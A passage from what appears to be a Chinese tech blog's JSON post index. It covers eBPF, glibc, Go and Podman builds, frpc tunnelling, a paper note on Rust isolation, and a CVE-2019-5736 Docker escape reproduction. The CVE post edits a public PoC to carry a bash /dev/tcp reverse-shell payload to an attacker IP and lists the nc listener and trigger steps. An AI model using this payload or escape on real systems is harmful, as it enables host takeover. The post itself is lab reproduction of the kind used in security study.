开发环境搭建及HelloWorld","slug":"eBPF-学习-开发环境搭建及HelloWorld","date":"2023-12-11T07:09:06.000Z","updated":"2023-12-15T06:58:11.098Z","comments":true,"path":"2023/12/11/eBPF-学习-开发环境搭建及HelloWorld/","link":"","permalink":"http://example.com/2023/12/11/eBPF-%E5%AD%A6%E4%B9%A0-%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8AHelloWorld/","excerpt":"开发环境准备 安装必要的工具和软件 Linux 内核：由于 eBPF 是一种内核技术，因此您需要有一个相对较新的 Linux 内核版本（推荐 4.8 及以上版本）来支持 eBPF 功能。 LLVM 和 Clang：这些工具用于编译 eBPF 程序。安装最新版本的 LLVM 和 Clang 可确保您获得最佳的 eBPF 支持。 合适的开发框架：例如 BCC （BPF Compiler Collection）、libbpf、cilium&#x2F;ebpf 或 eunomia-bpf","text":"开发环境准备 安装必要的工具和软件 Linux 内核：由于 eBPF 是一种内核技术，因此您需要有一个相对较新的 Linux 内核版本（推荐 4.8 及以上版本）来支持 eBPF 功能。 LLVM 和 Clang：这些工具用于编译 eBPF 程序。安装最新版本的 LLVM 和 Clang 可确保您获得最佳的 eBPF 支持。 合适的开发框架：例如 BCC （BPF Compiler Collection）、libbpf、cilium&#x2F;ebpf 或 eunomia-bpf 以eunomia-bpf进行演示 下载并安装eunomia-bpf开发工具 下载用于运行 eBPF 程序的 ecli 工具： 12wget https://aka.pw/bpf-ecli -O ecli &amp;&amp; chmod +x ./ecli./ecli -h 下载编译器工具链，用于将 eBPF 内核代码编译为配置文件或 WASM 模块： 12wget https://github.com/eunomia-bpf/eunomia-bpf/releases/latest/download/ecc &amp;&amp; chmod +x ./ecc./ecc -h Hello World从一个简单的 eBPF 程序开始，该程序在内核中打印一条消息。我们将使用 eunomia-bpf 编译器工具链将其编译成 BPF 字节码文件，然后使用 ecli 工具加载并运行程序。 为了举个例子，我们可以暂时忽略用户空间程序。 123456789101112131415161718192021/* SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause) */#define BPF_NO_GLOBAL_DATA#include &lt;linux/bpf.h&gt;#include &lt;bpf/bpf_helpers.h&gt;#include &lt;bpf/bpf_tracing.h&gt;typedef unsigned int u32;typedef int pid_t;const pid_t pid_filter = 0;char LICENSE[] SEC(&quot;license&quot;) = &quot;Dual BSD/GPL&quot;;SEC(&quot;tp/syscalls/sys_enter_write&quot;)int handle_tp(void *ctx)&#123; pid_t pid = bpf_get_current_pid_tgid() &gt;&gt; 32; if (pid_filter &amp;&amp; pid != pid_filter) return 0; bpf_printk(&quot;BPF triggered sys_enter_write from PID %d.\\n&quot;, pid); return 0;&#125; 该程序定义了一个handle_tp函数，并使用 SEC 宏将其附加到sys_enter_write跟踪点（即，在输入写入系统调用时执行）。 该函数使用 bpf_get_current_pid_tgid 和 bpf_printk 函数检索写入系统调用的进程 ID，并将其打印在内核日志中。 bpf_trace_printk() ：将信息输出到trace_pipe的简单机制 （&#x2F;sys&#x2F;kernel&#x2F;debug&#x2F;tracing&#x2F;trace_pipe）。这对于简单的用例来说很好，但它有局限性：最多 3 个参数;第一个参数必须是 %s（即字符串）;并且该trace_pipe在内核中全局共享，因此同时使用该trace_pipe的其他程序可能会中断其输出。更好的方法是使用 BPF_PERF_OUTPUT（） void *ctx ：ctx 本来是特定类型的参数，但由于这里没有使用，所以写成 void *。 return 0; ：这是必要的，返回 0（要了解原因，请参阅 #139 https://github.com/iovisor/bcc/issues/139）。 要编译和运行此程序，可以使用 ecc 工具和 ecli 命令。首先，在 Ubuntu&#x2F;Debian 上，执行以下命令： 1sudo apt install clang llvm 使用 ecc 编译程序： 1./ecc minimal.bpf.c 然后使用 ecli 运行编译后的程序： 1sudo ./ecli run package.json 运行此程序后，可以通过检查 &#x2F;sys&#x2F;kernel&#x2F;debug&#x2F;tracing&#x2F;trace_pipe 文件来查看 eBPF 程序的输出： 1sudo cat /sys/kernel/debug/tracing/trace_pipe | grep &quot;BPF triggered sys_enter_write&quot; 输出结果如下： grep-6987 [004] d..31 467.531973: bpf_trace_printk: BPF triggered sys_enter_write from PID 6987. grep-6987 [004] d..31 467.531995: bpf_trace_printk: BPF triggered sys_enter_write from PID 6987. grep-6987 [004] d..31 467.532011: bpf_trace_printk: BPF triggered sys_enter_write from PID 6987. grep-6987 [004] d..31 467.532023: bpf_trace_printk: BPF triggered sys_enter_write from PID 6987. grep-6987 [004] d..31 467.532046: bpf_trace_printk: BPF triggered sys_enter_write from PID 6987. 注意：如果您的 Linux 发行版（例如 Ubuntu）默认未启用跟踪子系统，则可能不会看到任何输出。使用以下命令启用此功能： 12sudo suecho 1 &gt; /sys/kernel/debug/tracing/tracing_on 错误解决 错误 Error: Failed to run native eBPF programCaused by: Bpf error: Failed to start polling: Bpf(“Failed to build skeleton: All ways tried to find vmlinux BTF, but not found. Please provide the vmlinux btf using env BTF_FILE_PATH. (Tried parameter btf_archive_path, BTF_FILE_PATH, and &#x2F;sys&#x2F;kernel&#x2F;btf&#x2F;vmlinux)”), RecvError 原因：没有配置好bpf环境 解决： 首先安装bpftool 1apt install linux-tools-6.2.0-37-generic 安装版本与内核版本相关 如果遇到下列错误 dpkg-deb: error: paste subprocess was killed by signal (Broken pipe)Errors were encountered while processing: &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives&#x2F;linux-tools-common_5.15.0-91.101_all.debE: Sub-process &#x2F;usr&#x2F;bin&#x2F;dpkg returned an error code (1) 解决方法： 1sudo dpkg -i --force-overwrite /var/cache/apt/archives/linux-tools-common_5.15.0-91.101_all.deb 之后运行 1sudo apt -f install 然后bpftool就安装好了 之后运行： 1bpftool btf dump file /sys/kernel/btf/vmlinux format c &gt; vmlinux.h 包含该 vmlinux.h，就意味着我们的程序可以使用内核中使用的所有数据类型定义，因此 BPF 程序在读取相关的内存时，就可以映射成对应的类型结构按照字段进行读取。 eBPF项目基本框架如上所述，eBPF 程序的基本框架包括： 头文件 定义许可证：您需要定义许可证，通常使用“Dual BSD&#x2F;GPL”。 定义 BPF 函数：需要定义一个 BPF 函数，例如名为 handle_tp，该函数以 void *ctx 为参数，返回 int。这通常是用 C 语言编写的。 使用 BPF 辅助函数：在 BPF 函数中，可以使用 bpf_get_current_pid_tgid（） 和 bpf_printk（） 等 BPF 辅助函数。 返回值 eBPF程序的开发和使用过程 定义 eBPF 程序的接口和类型：包括定义 eBPF 程序的接口函数、定义和实现 eBPF 内核映射和共享内存（性能事件）、定义和使用 eBPF 内核辅助函数。 编写 eBPF 程序代码：包括编写 eBPF 程序的主要逻辑、在 eBPF 内核映射上实现读写操作以及使用 eBPF 内核辅助函数。 编译 eBPF 程序：包括使用 eBPF 编译器（如 clang）将 eBPF 程序代码编译为 eBPF 字节码，并生成可执行的 eBPF 内核模块。ecc 本质上是调用 clang 编译器来编译 eBPF 程序。 将 eBPF 程序加载到内核中：包括将编译好的 eBPF 内核模块加载到 Linux 内核中，并将 eBPF 程序附加到指定的内核事件中。 使用 eBPF 程序：这包括监控 eBPF 程序的执行，以及使用 eBPF 内核映射和共享内存交换和共享数据。 在实际开发中，可能会有额外的步骤，例如配置编译和加载参数、管理 eBPF 内核模块和内核映射以及使用其他高级功能。 参考资料eBPF Tutorial by Example 1: Hello World, Framework and Development - eunomia — eBPF示例教程1：Hello World、框架和开发 - eunomia","categories":[],"tags":[]},{"title":"Ubuntu下glibc重新编译","slug":"glibc重新编译","date":"2023-12-10T09:12:38.000Z","updated":"2023-12-15T06:58:42.922Z","comments":true,"path":"2023/12/10/glibc重新编译/","link":"","permalink":"http://example.com/2023/12/10/glibc%E9%87%8D%E6%96%B0%E7%BC%96%E8%AF%91/","excerpt":"下载代码Index of &#x2F;gnu&#x2F;glibc The GNU C Library","text":"下载代码Index of &#x2F;gnu&#x2F;glibc The GNU C Library 编译源码12345mkdir buildcd build../configuremakesudo make install 有些报错是因为没有在..&#x2F;configure后加入对应的标志 关键选项说明 prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;glibc 指定glibc安装目录–with-headers&#x3D;&#x2F;usr&#x2F;include 指定需要的系统头文件目录 –with-binutils&#x3D;&#x2F;usr&#x2F;bin 指定需要的系统工具目录–with-libs&#x3D; 指定需要的库目录","categories":[],"tags":[{"name":"glibc","slug":"glibc","permalink":"http://example.com/tags/glibc/"}]},{"title":"go语言环境搭建以及重新编译安装","slug":"go语言环境搭建以及重新编译安装","date":"2023-12-10T08:35:10.000Z","updated":"2023-12-15T06:59:08.873Z","comments":true,"path":"2023/12/10/go语言环境搭建以及重新编译安装/","link":"","permalink":"http://example.com/2023/12/10/go%E8%AF%AD%E8%A8%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%BB%A5%E5%8F%8A%E9%87%8D%E6%96%B0%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85/","excerpt":"go环境搭建打开官网下载地址对应的系统版本 All releases - The Go Programming Language","text":"go环境搭建打开官网下载地址对应的系统版本 All releases - The Go Programming Language 执行tar命令将下载的文件解压到&#x2F;usr&#x2F;local目录下（官方推荐），得到go文件夹等 1tar -C /usr/local -zxvf go1.11.5.linux-amd64.tar.gz 添加&#x2F;usr&#x2F;local&#x2F;go&#x2F;bin目录到PATH变量中。添加到&#x2F;etc&#x2F;profile 123456vim /etc/profile# 在最后一行添加export GOROOT=/usr/local/goexport PATH=$PATH:$GOROOT/bin# 保存退出后source /etc/profile 重新编译gogo的源码目录下（&#x2F;usr&#x2F;local&#x2F;go），进入src文件夹，运行all.bash","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"go","slug":"编程语言/go","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/"}],"tags":[{"name":"go","slug":"go","permalink":"http://example.com/tags/go/"}]},{"title":"Ubuntu编译安装Podman","slug":"Ubuntu编译安装Podman","date":"2023-12-10T08:20:07.000Z","updated":"2023-12-15T07:00:33.913Z","comments":true,"path":"2023/12/10/Ubuntu编译安装Podman/","link":"","permalink":"http://example.com/2023/12/10/Ubuntu%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Podman/","excerpt":"官方安装文档 Podman Installation | Podman 准备工作","text":"官方安装文档 Podman Installation | Podman 准备工作首先安装依赖 12345678910111213141516171819202122sudo apt-get install \\ btrfs-progs \\ crun \\ git \\ golang-go \\ go-md2man \\ iptables \\ libassuan-dev \\ libbtrfs-dev \\ libc6-dev \\ libdevmapper-dev \\ libglib2.0-dev \\ libgpgme-dev \\ libgpg-error-dev \\ libprotobuf-dev \\ libprotobuf-c-dev \\ libseccomp-dev \\ libselinux1-dev \\ libsystemd-dev \\ netavark \\ pkg-config \\ uidmap 其中golang的版本太老，重新下载新版本的安装，其他安装不了的包可以暂时去掉。 123456export GOPATH=~/gogit clone https://go.googlesource.com/go $GOPATHcd $GOPATHcd src./all.bashexport PATH=$GOPATH/bin:$PATH conmon安装 12345git clone https://github.com/containers/conmoncd conmonexport GOCACHE=&quot;$(mktemp -d)&quot;makesudo make podman runc版本至少1.0.1 1234git clone https://github.com/opencontainers/runc.git $GOPATH/src/github.com/opencontainers/runccd $GOPATH/src/github.com/opencontainers/runcmake BUILDTAGS=&quot;selinux seccomp&quot;sudo cp runc /usr/bin/runc 编译安装1234git clone https://github.com/containers/podman/cd podmanmake BUILDTAGS=&quot;selinux seccomp&quot; PREFIX=/usrsudo make install PREFIX=/usr","categories":[{"name":"容器","slug":"容器","permalink":"http://example.com/categories/%E5%AE%B9%E5%99%A8/"},{"name":"Podman","slug":"容器/Podman","permalink":"http://example.com/categories/%E5%AE%B9%E5%99%A8/Podman/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"http://example.com/tags/Ubuntu/"},{"name":"Podman","slug":"Podman","permalink":"http://example.com/tags/Podman/"}]},{"title":"漏洞复现 CVE-2019-5736 docker容器逃逸","slug":"漏洞复现-CVE-2019-5736-docker容器逃逸","date":"2023-11-28T02:13:58.000Z","updated":"2023-12-21T07:10:26.570Z","comments":true,"path":"2023/11/28/漏洞复现-CVE-2019-5736-docker容器逃逸/","link":"","permalink":"http://example.com/2023/11/28/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2019-5736-docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/","excerpt":"环境搭建 docker version &lt;&#x3D;18.09.2 RunC version &lt;&#x3D;1.0-rc6 在ubuntu18.04环境下进行","text":"环境搭建 docker version &lt;&#x3D;18.09.2 RunC version &lt;&#x3D;1.0-rc6 在ubuntu18.04环境下进行 docker安装 12345678910sudo apt-get remove docker docker-engine docker-ce docker.iosudo apt-get updatesudo apt-get install -y apt-transport-https ca-certificates curl software-properties-commoncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -sudo apt-get updateapt-cache madison docker-cesudo apt-get install docker-ce=&lt;VERSION&gt;sudo apt-get install docker-ce=18.06.1~ce~3-0~ubuntusudo systemctl start dockerdocker info 123456# 添加安装源# 推荐国内源sudo add-apt-repository \\ &quot;deb [arch=amd64] https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu \\ $(lsb_release -cs) \\ stable&quot; 1sudo docker pull ubuntu:19.10 golang安装 12sudo apt install golang-gogo version payload 1git clone https://github.com/Frichetten/CVE-2019-5736-PoC.git 修改main.go 1var payload = &quot;#!/bin/bash \\n bash -i &gt;&amp; /dev/tcp/攻击机的ip/监听端口 0&gt;&amp;1&quot; 1sudo CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go 复现漏洞启动容器 1sudo docker run -itd --name 2019-5736 ubuntu:19.10 /bin/bash 将main复制进入容器 1sudo docker cp main 2019-5736:/home 进入容器执行 1sudo docker exec -it 2019-5736 /bin/sh 1./home/main 开启监听 1nc -vv -lp 7777 重新启动一个终端，再次启动容器 1sudo docker exec -it 2019-5736 /bin/sh","categories":[{"name":"CVE","slug":"CVE","permalink":"http://example.com/categories/CVE/"}],"tags":[]},{"title":"服务器frpc配置以及开机自启配置","slug":"服务器frpc配置以及开机自启配置","date":"2023-11-28T01:42:47.000Z","updated":"2023-11-28T02:09:21.071Z","comments":true,"path":"2023/11/28/服务器frpc配置以及开机自启配置/","link":"","permalink":"http://example.com/2023/11/28/%E6%9C%8D%E5%8A%A1%E5%99%A8frpc%E9%85%8D%E7%BD%AE%E4%BB%A5%E5%8F%8A%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E9%85%8D%E7%BD%AE/","excerpt":"下载frpc1wget https://github.com/fatedier/frp/releases/download/v0.52.3/frp_0.52.3_linux_arm64.tar.gz 解压","text":"下载frpc1wget https://github.com/fatedier/frp/releases/download/v0.52.3/frp_0.52.3_linux_arm64.tar.gz 解压1tar xvf frp_0.52.3_linux_amd64.tar.gz 修改脚本123456789[common]server_addr = 1.116.202.155 //服务器ipserver_port = 7900 //服务器端口[ssh_new]type = tcplocal_ip = 127.0.0.1local_port = 22remote_port = 10011 //要配置的端口 运行1./frps -c ./frps.ini 1./frpc -c ./frpc.ini 设置开机自启1vim /etc/systemd/system/frpc.service 123456789101112131415[Unit]Description=Frp Client ServiceAfter=network.target[Service]Type=simpleUser=nobodyRestart=on-failureRestartSec=5sExecStart=/home/plucky/Downloads/frp_0.22.0_linux_amd64/frpc -c /home/plucky/Downloads/frp_0.22.0_linux_amd64/frpc.iniExecReload=/home/plucky/Downloads/frp_0.22.0_linux_amd64/frpc reload -c /home/plucky/Downloads/frp_0.22.0_linux_amd64/frpc.iniLimitNOFILE=1048576[Install]WantedBy=multi-user.target 设置开机自启 1sudo systemctl enable frpc 启动frpc 1sudo systemctl start frpc 查看frpc状态 1sudo systemctl status frpc","categories":[],"tags":[]},{"title":"论文阅读 TRUST: A Compilation Framework for In-process Isolation to Protect Safe Rust against Untrusted Code","slug":"论文阅读-TRUST","date":"2023-11-26T03:47:35.000Z","updated":"2023-11-26T13:37:56.939Z","comments":true,"path":"2023/11/26/论文阅读-TRUST/","link":"","permalink":"http://example.com/2023/11/26/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-TRUST/","excerpt":"摘要 Rust的发明是为了帮助开发人员构建高度安全的系统。它带有各种编程结构，强调安全性和对内存布局的控制。Rust强制执行关于类型系统和所有权模型的严格规则，以启用对所有空间和时间安全错误的编译时检查。尽管在安全性上有这种优势，Rust的类型系统施加的限制使得表达某些设计或计算变得困难或低效。为了简化他们的编程，开发人员经常包含来自不安全的Rust或用其他语言编写的外部库的不可信代码。可悲的是，为了灵活性或效率而采用这种不可信代码的编程实践破坏了安全Rust所提供的强大安全保证。本文提出了一个编译框架TRUST，它通过进程内隔离为Rust提供安全的可信保护，防止程序中存在不可信的代码。它的主要策略是在一个隔离的内存区域中分配对象，该区域可以被安全的Rust访问，但限制不受信任的人写入。 为了实现这一点，TRUST采用了软件故障隔离和x86保护密钥。它可以直接应用于任何Rust代码，而不需要手动更改。我们的实验表明，在Rust中运行11个广泛使用的crate时，TRUST是有效和高效的，平均只产生7.55%的运行时开销和13.30%的内存开销。","text":"摘要 Rust的发明是为了帮助开发人员构建高度安全的系统。它带有各种编程结构，强调安全性和对内存布局的控制。Rust强制执行关于类型系统和所有权模型的严格规则，以启用对所有空间和时间安全错误的编译时检查。尽管在安全性上有这种优势，Rust的类型系统施加的限制使得表达某些设计或计算变得困难或低效。为了简化他们的编程，开发人员经常包含来自不安全的Rust或用其他语言编写的外部库的不可信代码。可悲的是，为了灵活性或效率而采用这种不可信代码的编程实践破坏了安全Rust所提供的强大安全保证。本文提出了一个编译框架TRUST，它通过进程内隔离为Rust提供安全的可信保护，防止程序中存在不可信的代码。它的主要策略是在一个隔离的内存区域中分配对象，该区域可以被安全的Rust访问，但限制不受信任的人写入。 为了实现这一点，TRUST采用了软件故障隔离和x86保护密钥。它可以直接应用于任何Rust代码，而不需要手动更改。我们的实验表明，在Rust中运行11个广泛使用的crate时，TRUST是有效和高效的，平均只产生7.55%的运行时开销和13.30%的内存开销。 Introduction几十年来，C&#x2F; C++一直是主流语言，但它们是不安全的，因为其宽松的语义允许许多未定义的行为，这些行为通常表现为无数安全关键的普遍错误，如缓冲区溢出、free后使用和其他内存可利用错误。语言Rust是为了解决C&#x2F; C++固有的安全问题而发明的，它引入了新的语法和语义，如指针所有权、生命周期和借用。该语言的特点和构造被精心设计为可以很容易静态分析以保证安全性，因此很少或者根本不需要进行运行时的完整性检查。 然而，尽管Rust具有强大的静态安全保证，但其严格的语义和保证规则可能会限制表现力和性能。 因此，为了实用性，Rust通过允许程序员包含不受信任的代码来放宽其严格的安全规则，这些代码可以在编译时免于严格的完整性检查。不可信代码的一个来源是Rust中的代码段，称为unsafe代码块，它们通常包含少量对低级编码或性能至关重要的操作，例如原始指针操作和未受保护的类型转换。 这些封装在Rust不安全块中的操作是用Rust之外的另一种语言编写的，称为不安全Rust，它不一定遵守真正Rust(最好是安全Rust)语言的所有安全规则。作为不可信代码的另一个来源，程序员使用用未知语言编写的外部库来节省开发成本。将这些不受信任的代码与安全Rust结合起来的编程实践确实在表达能力和效率方面带来了各种好处，但显然会破坏安全Rust的强大安全保证，因为在与安全Rust代码相同的地址空间中运行不受信任的代码会使整个程序处于暴露于不安全块或外部库的危险之中。 在本文中，我们的目标是阐明使用不受信任的代码源进行Rust编程的潜在安全风险，并提出我们的编译框架TRUST，该框架旨在通过进程内隔离来降低风险，其中Rust代码通过TRUST转换，将不安全的块和外部库函数与安全的Rust代码部分隔离开来，我们将在后面称之为安全块。我们选择了进程内方案，因为它通常被认为比进程间隔离方案更有效，因为隔离需要昂贵的操作系统干预来支持虚拟化。事实上，以前已经开发了几种进程内方案，以如此高效地解决此风险，但它们有一些限制，例如缺乏rust感知的程序分析，需要昂贵的上下文切换，或者依赖于开发人员注释。 通过将不安全的块和外部库与安全块隔离开来，TRUST可以防止这些不可信代码中的漏洞在没有适当权限的情况下破坏安全Rust的关键数据。为了实现Rust应用程序的进程内隔离，TRUST首先将内存划分为安全和不安全两个区域，其中分别包含安全对象和不安全对象。然后，TRUST区分Rust代码块对这些区域的访问权限。它允许安全块访问这两个区域。相反，在默认情况下，它拒绝任何不安全块和外部库对安全区域的访问，尽管根据其安全策略，一些不受信任的代码块可能被授予有限的读取安全区域的权限。这里值得注意的是，TRUST可以通过确定将哪些对象分配给两个区域来对Rust程序中的每个单独对象执行访问控制。也就是说，对于保密性和完整性具有最高优先级的安全堆栈&#x2F;堆对象，TRUST将其分配到安全区域，以限制任何不受信任的代码对其的访问，除了一些不受信任的块在特殊情况下获得对安全对象的读权限。所有其他物品将被归类为不安全物品，并置于不安全区域。 为了自动插装Rust代码以实现进程内隔离，我们对Rust框架进行了修改，包括前端用于IR生成，后端用于二进制生成。当Rust代码被用于进程内隔离时，TRUST应用不同的技术来处理不安全的块和外部库，因为前者可以作为源代码提供给TRUST，而后者则假定只能以二进制形式提供。 给定不安全块的源代码，TRUST应用软件故障隔离。首先，为了在代码中处理不安全的堆对象，TRUST识别它们的分配站点，并用对自定义分配器的调用替换这些站点，该分配器使用预定义的地址范围在不安全区域中分配内存对象。接下来，对于不安全的堆栈对象，TRUST将代码转换为在位于不安全区域的特殊堆栈中单独分配它们。最后，不安全块中的所有内存操作都用屏蔽来阻止区域外的访问。相反，为了处理二进制形式的外部库，TRUST应用了一种基于英特尔内存保护密钥(MPK)的隔离技术，因为我们必须保守地假设所有这些库函数都是不安全的，并且只使用不安全的对象。因此，TRUST为安全区域和不安全区域的内存页分配单独的密钥，并在每次执行流进出外部库时切换访问权限。 我们通过扩展Rust编译器及其运行时库实现了TRUST。为了评估效率，我们使用了15个广泛使用的crate，包括Rust标准库的核心组件。实验结果表明:TRUST使测试库的运行速度平均降低了12.65%。 我们通过比较XRust和Sandcrust这两种现有技术来进一步评估TRUST。实验结果表明，TRUST比XRust快3倍，比Sandcrust快2倍以上。 BackgroundRust中的所有权。 Rust的所有权策略使编译器能够静态地避免内存安全错误。在Rust程序中，内存对象必须在执行期间一次由一个变量独占地拥有。当程序需要复制或移动指向内存对象的指针时，所有权必须永久地转移到新变量或临时借用。所有权策略严格，零容忍，适用于数据表示、抽象和算法设计。例如，Rust有树形的链接数据结构，完全不允许实现像双链表这样的可变数据结构。为了解决这个严格的策略，Rust引入了不安全的Rust，这是一种允许一些宽松的性能和表达规则的方言。与用安全Rust编写的程序不同，用不安全Rust编写的程序可以操作原始指针、调用外部库函数或使用可变的全局变量。事实上，Rust程序通常由多种形式的不安全Rust代码组成。一个代码块可以用关键字unsafe包装，或者当函数用相同的关键字注释时，可以用不安全的Rust编写整个函数。尽管在Rust中，不安全块通常指的是前者，但为了简洁起见，我们滥用了这个术语来指代用不安全Rust编写的任何代码。 智能指针。 智能指针是一个广泛使用的概念，其中指针被表示为包含内存地址和元数据的复合数据类型。最常见的是，元数据要么是指针预期指向的地址范围，要么是指针的能力。Rust中的许多标准库使用这些智能指针来确保在编译时无法静态检查的内存安全。 由于这个原因，对智能指针元数据的操作被认为是不安全的，因此只能在不安全的块中进行。 内存保护键（MPK）。 英特尔MPK，也被称为用户空间保护密钥(PKU)，是英特尔提供的一种单线程硬件机制，用于帮助维护组中的内存页面权限。使用MPK，每个页被分配一个4位的值，称为pkey，表示该页所属的组。具有MPK的处理器有一个称为pkru的特殊寄存器，它确定当前进程对每个页组的权限。可以使用特殊指令rdpkru和wrpkru来调查和更新权限。使用进程内寄存器的权限快速切换促使许多早期研究将其用于进程内隔离，就像TRUST用于隔离外部库一样。特别是，TRUST为每个组件创建单独的内存区域，使用MPK密钥和PKRU来授予和撤销访问权限，并采用现有机制来保护这种基于MPK的保护免受目标攻击。例如，TRUST使用静态分析和精心设计的入口&#x2F;出口门，如ERIM和Hodor所示。此外，TRUST监视和hooks系统调用，以进一步防止外部库逃避隔离，这是另一篇文章《PKU Pitfalls》中提出的建议。 Motivation本节给出一些示例，说明不可信代码中的漏洞会破坏安全Rust的内存安全性，介绍进程内隔离机制如何提供帮助，并讨论现有机制的局限性。 Vulnerabilities in Untrusted Code只要安全的Rust代码和不受信任的代码在同一进程中运行，无论编译时分析多么仔细，Rust程序总是容易受到内存安全漏洞的攻击。作为不可信代码的一类，用不安全Rust编写的不安全块超出了专为安全Rust设计的分析范围。在处理另一类不受信任的代码(外部库)时，这种分析甚至更无用，这些代码可以用任何语言编写，包括C&#x2F; C++等不安全的语言。这种编译时分析在保证不可信代码的内存安全方面的无能，可能会为不可信代码的错误打开损坏安全代码中的关键内存对象的方便之门。 图1显示了一个Rust程序，其中指针在安全块中定义，并在不安全块中使用。该示例在第4行和第9行分配两个堆栈对象，并分别获取针对第7行和第11行对象的原始指针。 原始指针在同一行递增，然后用于修改第8行和第12行中的堆栈对象。这个例子中的问题是程序使用了一个全局变量offset_in，这个变量可以在外部的任何地方修改。在偏移量计算中使用全局变量使程序容易受到攻击。在第8行和第14行，攻击者操纵offset_in可以控制写入哪个地址，甚至可以到达安全对象。 图2显示了从CVE-2021-28879中引用的zip crate中提取的另一个示例，其中self。self.index可以设置为大于self.len的值(第7行)，导致size_hint函数中的整数溢出(第13行)。破坏size_hint的返回值会导致在第8行调用的__iterator_get_unchecked(i)错误地将迭代器返回到对象a之外的内存位置。当再次使用已消耗的Zip迭代器时，攻击者可能会利用这一点创建缓冲区溢出，如图3所示。 图4是一个外部库调用的示例，它可能会破坏执行堆栈上安全对象的内存安全性。由此产生的漏洞类似于C&#x2F; C++中的格式字符串错误。它从堆栈中读取的信息与未定义的字符串转换参数(例如printw(“%s%s%s”))一样多。这样的错误可能为攻击者利用外部库代码从堆栈中读取尽可能多的信息并将其打印到标准输出铺平了道路。 Mitigation by In-Process IsolationRust程序由两段不同的代码组成:一段不受信任的代码，其中包含前面讨论过的潜在漏洞和要保护的安全块免受此类攻击。进程内隔离将安全块及其相关数据与代码的其余部分隔离开来，即隔离不受信任的代码，这是解决程序内这种保护问题的自然选择。TRUST自动识别不受不可信代码保护的对象，并应用进程内隔离机制，以确保不可信代码无法访问它们。 XRust和Fidelius Charm在运行时采用与TRUST类似的方法。XRust使开发人员能够使用SFI隔离不安全的块。所有被程序员标记为不安全的内存访问指令都使用边界检查来执行设计的策略。不安全块只能访问由XRust的附加内存管理接口分配的不安全对象。它们后来表明，可以通过过程间数据流分析自动插入额外的内存管理接口。 它们还引入了SFI的替代方案，即基于保护页的保护，它以安全性换取性能。Fidelius Charm专门用于从Rust程序隔离不受信任的外部库的进程内隔离。对内核进行了扩展，以提供用于切换特权级别的系统调用接口。受保护的Rust程序在进入或离开外部代码块时使用该接口切换特权级别。对于每个请求，内核扩展通过更新页表属性来更改对包含安全对象的某些内存页的访问权限。 因此，开发人员有责任使用接口来增强他们的程序，以保护敏感数据对象。 Limitations of Existing Mechanisms即使以组合的形式，这些工具也不足以严格限制对不可信代码的攻击，更不用说现有的机制都不能隔离外部库和不安全的块，如表1所示。首先，大多数机制需要手动更改程序。Fidelius Charm和Sandcrust没有演示任何自动转换，而是将其作为开发人员的任务。XRust使用现有的数据流分析来自动转换程序，但是自动转换不考虑Rust使用的堆分配器和智能指针的包装器。其次，在进入和离开隔离的不受信任代码上下文时，现有机制需要昂贵的上下文切换。XRust没有明确地解决外部库引入的不安全问题，而且Fidelius Charm在每次上下文切换时都会更改页表项的属性。这个上下文切换是预期会出现较长的延迟，因为必须更新许多页表项的属性，并且必须刷新相应的项。第三，Fidelius Charm(现有的用于外部库的进程内隔离机制)不能保证堆栈指针的完整性。存在许多现有的进程内隔离机制，其中默认上下文具有较低的特权，进程临时进入具有较高特权的上下文。与这些不同，Fidelius Charm和TRUST创建一个具有较低特权的上下文，并暂时完全控制注册内容。 这使得包含堆栈指针的寄存器不受保护，攻击者可能伪造一个伪造的堆栈，并使堆栈指针以它为目标，从而影响安全块的行为。 最后，沙箱还必须考虑堆栈对象，因为攻击者破坏堆栈对象可能会误导安全Rust违反内存安全。 手工分析和转换。 现有机制需要手动更改程序。开发人员应该识别不受信任代码使用的对象，并使用新提出的内存管理功能来处理它们。XRust是一个例外，因为它演示了如何使用现有的数据流分析来检测涉及不安全对象的内存操作，但是XRust的应用主要需要手动更改代码，正如我们在XRust的开放实现中发现的那样。例如，为了加强图1中所示的早期示例，开发人员应该注意到vector在不安全块中使用，并更改代码以从不安全区域分配内存。如果不这样做，XRust将无法识别不安全，并将向量放置在安全区域。 沙箱外部库的低效率。 在进入或离开外部库时，现有机制具有很高的上下文切换开销。Sandcrust使用一个运行在不同虚拟地址空间的独立进程为主进程提供外部库服务。rust编写的代码可以使用进程间通信(IPC)来调用外部库函数，而不是其原始形式，即简单的函数调用。这个远程过程调用明显地增加了开销，因为参数和返回值必须通过IPC传递。此外，开发人员还负责手动翻译程序，即交付外部库需要的任何数据对象，或者向外部库进行更新或从外部库进行更新。Fidelius Charm不需要IPC，但程序仍然需要请求OS内核进行上下文切换。不幸的是，这个对内核的调用仍然是昂贵的，因为它更新页表以更改进程对其内存页的权限。页表的更新改变了Rust程序页面的属性，从而使相应的翻译暂置缓冲区(TLB)条目无效，并增加了TLB缺失率。 Threat Model and 